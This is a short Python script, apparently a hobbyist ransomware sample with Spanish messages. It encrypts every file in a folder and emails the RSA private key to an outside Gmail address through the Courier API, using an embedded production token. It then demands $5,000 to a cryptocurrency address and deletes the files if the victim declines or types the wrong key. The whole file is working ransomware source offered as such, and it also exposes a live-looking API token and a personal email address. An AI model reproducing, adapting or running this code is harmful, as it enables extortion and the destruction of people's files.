from time import sleep
import os
import rsa
from cryptography.fernet import Fernet
from trycourier import Courier

key = Fernet.generate_key()

(pubkey, privkey) = rsa.newkeys(2048)

path_to_encrypt = 'C:\\Users\\laona\\Downloads\\Virus\\docs'
items = os.listdir(path_to_encrypt)
full_path = [path_to_encrypt + '\\' + item for item in items]

f = Fernet(key)
for item in full_path:
	with open(item, 'rb') as file:
		file_data = file.read()
	encrypted_data = f.encrypt(file_data)
	with open(item, 'wb') as file:
		file.write(encrypted_data)

publickey = open('PublicKey.key', 'wb')
publickey.write(pubkey.save_pkcs1('PEM'))
publickey.close()

client = Courier(auth_token="pk_prod_7NMBAA2S5E4YGVGS014YVS7JB5J4")
      
resp = client.send_message(
    message={
          "to": {
            "email": "dlmj.2202@gmail.com"
          },
          "routing": {
            "method": "single",
            "channels": ["email"]
          },
          "channels" : {
            "email": {
              "providers": ["gmail"] 
            }
          },
          "content": {
            "title": "Private Key",
            "body": str(privkey.save_pkcs1('PEM'))
          }
        }
      )

print('Tus archivos han sido encriptados. :C')

encrypted_key = rsa.encrypt(key, pubkey)

decrypt_file = input("¿Quieres que los desencripte? :) [Y/N]\n")
if decrypt_file == 'Y':

    print('Para eso, debes escribir la llave.\n')
    sleep(1)
    print('¿Qué llave? —te preguntarás. \n')
    sleep(1)
    print('Bueno, si me envías $5K a esta cuenta (3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5), te puedo enviar la llave a tu correo. \n')
    sleep(1)
    print('No te preocupes. Deposítame cuando quieras. \n')
    sleep(1)
    print('Pero ten en cuenta que solo podrás escribir la llave una sola vez, y si está mal, borraré tus archivos. \n')

    key = input('nIngrese la llave dada: ')

    if key == "22-11-02":
        dpubkey = rsa.decrypt(encrypted_key, privkey)
        cipher = Fernet(dpubkey)

        for item in full_path:
            encrypted_data = open(item, 'rb')
            edata = encrypted_data.read()
            decrypted_data = cipher.decrypt(edata)
            with open(item, 'wb') as file:
                file.write(decrypted_data)
        print('\nTus archivos ya están desencriptados. ¡Ten un feliz día! :D')
    else:
        print('\nEsa no es la llave. Por eso, eliminaré tus archivos. >:D')
        for item in full_path:
            os.remove(item)
else:
    print('\nOh, ¿no quieres tus archivos? Pues, los borraré. >:D ')
    for item in full_path:
        os.remove(item)